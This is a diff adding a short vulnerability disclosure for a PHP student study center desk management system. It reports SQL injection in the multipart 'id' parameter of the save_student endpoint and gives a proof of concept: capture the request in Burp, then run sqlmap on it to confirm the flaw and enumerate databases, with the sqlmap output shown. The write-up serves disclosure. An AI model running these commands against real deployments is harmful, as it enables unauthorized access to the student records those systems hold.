@@ -1,0 +1,63 @@
+---
+slug: student-study-center-desk-management-system-save_student
+Title: Student Study Center Desk Management System (save_student.php)
+---
+
+## Details
+
+### Related Code file: 
+`/sscdms/classes/Master.php?f=save_student`
+
+### Injection parameter: 
+`MULTIPART id`
+
+POST parameter 'MULTIPART id' is vulnerable.
+
+
+
+
+
+## POC
+
+![1](https://github.com/user-attachments/assets/0e5c28e8-b806-46fd-bc20-3d028f54c0db)
+
+Intercept request using Burpsuite Proxy.
+
+![2](https://github.com/user-attachments/assets/228d93ed-97a3-4160-9d34-a825cde68558)
+
+Save the request to `save_student.txt`.
+
+### Verify vulnerability
+
+```
+sqlmap -r save_student.txt --batch
+```
+
+![53](https://github.com/user-attachments/assets/a1665af9-cf9e-412d-9401-a2adb8f6ea95)
+
+```
+Parameter: MULTIPART id ((custom) POST)
+    Type: error-based
+    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: -----------------------------250939851917583644163997292923
+Content-Disposition: form-data; name="id"
+```
+
+
+
+### Dump database
+
+```
+sqlmap -r save_student --batch --dbs
+```
+
+![54](https://github.com/user-attachments/assets/7b8d276d-2979-494c-bbc3-4215c30f511a)
+
+```
+[10:03:23] [INFO] fetching database names
+[10:03:23] [INFO] retrieved: 'information_schema'
+[10:03:24] [INFO] retrieved: 'sscdms'
+available databases [2]:
+[*] information_schema
+[*] sscdms
+```
